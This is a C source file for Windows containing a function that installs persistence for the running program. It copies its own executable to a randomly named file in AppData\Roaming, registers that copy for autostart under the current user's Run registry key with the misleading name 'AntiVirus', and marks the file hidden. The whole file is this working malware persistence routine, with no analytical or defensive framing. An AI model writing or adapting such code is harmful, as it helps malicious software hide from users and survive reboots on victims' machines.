#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "random.h"
#include "types.h"

char prog_globalPath[256];

int reg_Setup(void)
{	
	if(GetModuleFileName(NULL, prog_globalPath, 256))
	{
		if(strstr(prog_globalPath, "AppData\\Roaming") != NULL) //v papkata appdata e
		{
			return 0;
		}

		char* appPath = getenv("APPDATA");
		char* randName = random_Ascii(10);
		int pathLen = strlen(appPath) + strlen(randName) + 5 + sizeof(char);
		char* newPath = malloc(pathLen);

		snprintf(newPath, pathLen, "%s\\%s.exe", appPath, randName);
		free(randName);

		HKEY hkey;
		DWORD dwDispos;

		if(RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hkey, &dwDispos) != ERROR_SUCCESS)
		{
			free(newPath);

			return 1;
		}

		RegSetValueEx(hkey, "AntiVirus", 0, REG_SZ, (LPBYTE)newPath, strlen(newPath) + 1);
		RegCloseKey(hkey);

		FILE *fo = fopen(prog_globalPath, "rb");

		if(!fo)
		{
			free(newPath);

			return 1;
		}

		FILE *fd = fopen(newPath, "wb");

		if(!fd)
		{
			fclose(fo);
			free(newPath);

			return 1;
		}

		fseek(fo, 0, SEEK_END);
		uint32 size = ftell(fo);
		fseek(fo, 0, SEEK_SET);

		uint8* content = malloc(size + sizeof(uint8));
		
		if(!fread(content, 1, size, fo))
		{
			fclose(fd);
			fclose(fo);
			free(newPath);
			free(content);

			return 1;
		}

		if(!fwrite(content, 1, size, fd))
		{
			fclose(fd);
			fclose(fo);
			free(newPath);
			free(content);

			return 1;
		}

		SetFileAttributes(newPath, FILE_ATTRIBUTE_HIDDEN);
		
		fclose(fd);
		fclose(fo);
		free(newPath);
		free(content);

		return 1;
	}

	return 1;
}